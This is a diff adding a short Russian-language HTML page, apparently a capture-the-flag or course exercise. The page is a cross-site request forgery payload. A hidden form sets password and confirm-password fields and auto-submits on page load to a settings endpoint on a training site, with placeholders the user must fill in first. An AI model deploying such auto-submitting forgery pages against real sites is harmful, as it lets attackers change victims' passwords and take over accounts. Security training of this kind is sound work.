@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>CTF — отправка формы</title>
+</head>
+<body>
+  <p id="status">Подготовка формы…</p>
+  <form id="settings-form" action="https://cats.is-course.ru/settings" method="post" enctype="application/x-www-form-urlencoded">
+    <input type="hidden" name="password" value="&lt;word&gt;">
+    <input type="hidden" name="confirm-password" value="&lt;word&gt;">
+  </form>
+  <noscript>Для автоматической отправки требуется JavaScript.</noscript>
+  <script>
+    const form = document.getElementById("settings-form");
+    const status = document.getElementById("status");
+    const password = form.elements.namedItem("password").value;
+    const confirmation = form.elements.namedItem("confirm-password").value;
+    if (password === "<word>" || confirmation === "<word>") {
+      status.textContent = "Замените заглушку <word> в обоих полях на тестовое значение.";
+    } else if (password !== confirmation) {
+      status.textContent = "Значения полей должны совпадать.";
+    } else {
+      status.textContent = "Отправка формы на учебный стенд…";
+      form.submit();
+    }
+  </script>
+</body>
+</html>
